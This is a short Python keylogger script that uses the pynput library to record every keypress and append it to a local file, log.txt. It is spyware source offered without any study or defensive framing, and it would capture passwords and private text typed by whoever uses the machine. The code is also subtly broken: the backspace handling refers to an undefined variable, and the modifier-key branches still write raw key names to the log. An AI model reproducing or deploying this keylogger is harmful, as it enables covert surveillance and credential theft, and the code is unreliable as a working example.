from pynput.keyboard import Listener
def write_to_file(key):
    keydata= str(key)
    keydata= keydata.replace("'","")
    #keydata= keydata.strip("'")

    if keydata =='Key.space':
        keydata=' '
    elif keydata =='Key.shift':
        pass
    elif keydata =='Key.ctrl_l' or keydata =='Key.ctrl_r':
       pass
    elif keydata =='Key.caps_lock':
       pass
    elif keydata =='Key.enter':
        keydata='\n'
    elif keydata =='Key.tab':
        keydata='\t'
    elif keydata == 'Key.backspace' and len(text) == 0:
        pass
    elif keydata == 'Key.backspace' and len(text) > 0:
        text = text[:-1]
    elif keydata =='Key.backspace':
        keydata=''
    elif keydata =='Key.left':
        keydata=''
    elif keydata =='Key.right':
        keydata=''
    elif keydata =='Key.up':
        keydata=''
    elif keydata =='Key.down':
        keydata=''
    elif keydata =='Key.alt':
        keydata=''
    with open("log.txt",'a') as f:
        f.write(keydata)

with Listener(on_press=write_to_file)as l:
    l.join()
    